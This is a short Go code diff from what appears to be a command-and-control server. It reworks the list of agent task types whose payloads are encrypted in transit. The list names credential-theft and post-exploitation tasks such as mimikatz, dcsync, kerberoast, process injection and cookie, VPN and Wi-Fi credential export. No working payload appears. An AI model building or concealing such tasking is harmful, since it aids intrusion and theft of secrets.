@@ -1829,14 +1829,21 @@ func (s *Server) fetchPendingTasks(uuid string, limits ...int) []task {
 // sensitiveTaskTypes are task types whose Command/Data fields can carry
 // secrets or code and are therefore encrypted at dispatch time (in addition
 // to the transport envelope) with the session key, bound to (agent, task).
-var sensitiveTaskTypes = map[string]bool{
-	"shell": true, "ps": true, "powerpick": true,
-	"inject": true, "shinject": true, "spawn": true, "shspawn": true,
-	"peloader": true, "bof": true,
-	"mimikatz": true, "creds": true, "kerberoast": true, "dcsync": true, "lsa_bypass": true,
-	"password_spray": true,
-	"download_url": true, "upload": true,
-	"cookie_export": true, "vpn_creds": true, "wifi_creds": true,
+// The set extends the at-rest encryption set (db.SensitiveTaskTypes) with
+// operator-facing types that stay searchable in the database (shell, ps,
+// upload, download_url) but must not travel the wire in clear.
+var sensitiveTaskTypes = buildSensitiveTaskTypes()
+
+func buildSensitiveTaskTypes() map[string]bool {
+	m := make(map[string]bool, len(db.SensitiveTaskTypes)+4)
+	for k := range db.SensitiveTaskTypes {
+		m[k] = true
+	}
+	for _, k := range []string{"shell", "ps", "upload", "download_url",
+		"kerberoast", "lsa_bypass", "cookie_export", "vpn_creds", "wifi_creds"} {
+		m[k] = true
+	}
+	return m
 }
 
 // encryptTaskPayload encrypts sensitive task Command/Data fields with the
